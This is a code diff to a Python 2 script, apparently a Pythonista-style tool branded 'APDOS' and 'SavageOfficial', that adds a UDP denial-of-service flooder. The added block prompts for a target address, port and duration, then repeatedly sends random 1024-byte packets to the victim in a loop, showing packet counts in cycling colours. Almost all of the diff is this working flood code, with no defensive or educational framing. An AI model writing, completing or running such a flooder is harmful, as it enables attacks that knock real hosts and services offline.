@@ -82,13 +82,54 @@ console.set_color()
 print "###################################"
 print ""
 console.set_font()
-print "     -=-+- -+-=-  -=-+- -+-=-"
 if sys.argv[2] == "rainbow":
+	import random
+	console.set_color(130, 0, 0)
+	print "\n     -+--=:=-  -++-  -=:=--+-"
+	console.set_color()
+	console.set_font('HoeflerText-Black')
+	print " " * 32 + "SavageOfficial"
+	console.set_font()
+	console.set_color(130, 0, 0)
+	print "     -+--=:=-  -++-  -=:=--+-\n"
+	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	bytes = random._urandom(1024) * int(sys.argv[1])
+	victim = raw_input(' -+- Target: ')
+	vport = input(' -+- Port: ')
+	duration = input(' -+- Run: ')
+	console.set_color()
 	print ""
-	from UDPdos import colordos
-	colordos()
+	timeout = time.time() + duration
+	hue = 0.45
+	sent = 0
+	from colorsys import hsv_to_rgb
+	while 1:
+		try:
+			if time.time() > timeout:
+				break		
+			else:
+				pass
+		except KeyboardInterrupt:
+			sys.exit()
+		try:
+			client.sendto(bytes, (victim, vport))
+			client.sendto(bytes, (victim, vport))
+			client.sendto(bytes, (victim, vport))
+			client.sendto(bytes, (victim, vport))
+			client.sendto(bytes, (victim, vport))
+		except:
+			pass
+		sent = sent + 5
+		try:
+			r, g, b = hsv_to_rgb(hue, 1.0, 0.8)
+			console.set_color(r, g, b)
+			hue += 0.001
+			print "%s Packets: %s Port: %s " %(sent, victim, vport)
+		except KeyboardInterrupt:
+			sys.exit()
 	console.set_color()
 	sys.exit()
+print "     -=-+- -+-=-  -=-+- -+-=-"
 console.set_font('AmericanTypewriter', 15)
 print " " * 29 + "- APDOS -"
 console.set_font()
